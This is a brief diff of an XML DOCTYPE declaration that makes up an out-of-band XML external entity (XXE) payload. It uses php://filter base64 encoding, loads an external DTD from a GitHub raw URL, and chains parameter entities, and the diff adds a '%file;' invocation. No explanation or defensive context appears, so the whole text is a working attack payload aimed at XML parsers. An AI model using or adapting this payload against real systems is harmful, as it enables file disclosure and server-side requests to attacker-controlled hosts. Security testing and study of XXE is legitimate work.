@@ -2,6 +2,7 @@
 <!DOCTYPE roottag [ 
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=https://raw.githubusercontent.com/pszot/publicscripts/cfbcafab3feef388878fb5f6908fd4e647c581ba/xml.xml">
  <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/master/external.dtd">
+ %file;
  %dtd;
  %param1;
 ]>
